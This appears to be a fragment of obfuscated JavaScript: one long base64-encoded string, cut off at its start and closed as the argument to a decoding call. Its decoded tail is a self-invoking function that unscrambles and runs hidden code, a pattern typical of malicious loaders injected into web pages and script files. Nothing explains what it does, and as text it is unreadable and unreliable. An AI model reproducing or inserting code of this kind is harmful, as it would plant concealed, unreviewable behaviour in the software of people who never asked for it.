pN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
